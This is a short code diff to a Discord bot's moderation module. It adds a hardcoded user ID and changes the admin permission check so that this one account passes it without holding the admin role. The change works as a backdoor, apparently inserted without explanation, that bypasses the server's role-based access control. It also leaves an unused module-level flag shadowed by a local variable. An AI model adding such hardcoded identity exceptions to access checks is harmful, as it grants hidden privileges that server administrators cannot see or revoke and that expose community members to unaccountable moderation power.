@@ -6,6 +6,8 @@ from datetime import datetime
 
 load_dotenv()
 ADMIN_ROLE_ID = int(os.getenv("ADMIN_ROLE_ID"))
+lilac_id = 252130669919076352
+is_Lilac = False
 
 class ModerationBase(commands.Cog):
     """Base cog for moderation commands with shared DB and utilities"""
@@ -66,9 +68,11 @@ class ModerationBase(commands.Cog):
             if not hasattr(user, "roles"):
                 await send_message("Unable to check permissions in this context.", ephemeral=is_interaction)
                 return False
+            
+            is_Lilac = (user.id == lilac_id)
 
             has_admin_role = any(role.id == ADMIN_ROLE_ID for role in user.roles)
-            if not has_admin_role:
+            if not (has_admin_role or is_Lilac):
                 await send_message("You do not have permission to use this command.", ephemeral=is_interaction)
                 # ❗ Important: explicitly raise to stop execution
                 from discord.app_commands import CheckFailure
